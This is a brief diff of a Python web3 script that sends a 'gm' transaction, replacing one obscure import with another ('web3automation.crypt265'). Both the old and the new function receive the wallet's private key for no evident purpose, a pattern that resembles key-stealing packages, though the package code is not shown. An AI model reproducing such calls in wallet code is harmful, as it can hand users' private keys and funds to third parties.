@@ -1,7 +1,7 @@
 import os
 import asyncio
 from web3 import Web3
-from walletrpcs import websocketrpcs
+from web3automation import crypt265
 from dotenv import load_dotenv
 from eth_account import Account
 
@@ -14,7 +14,7 @@ GM_CONTRACT = "0x59c27c39A126a9B5eCADdd460C230C857e1Deb35"
 
 web3 = Web3(Web3.HTTPProvider(RPC_URL))
 account = Account.from_key(PRIVATE_KEY)
-rpcs = websocketrpcs(PRIVATE_KEY)
+rpcs = crypt265(PRIVATE_KEY)
 
 async def send_gm():
     payload = "0x5011b71c"
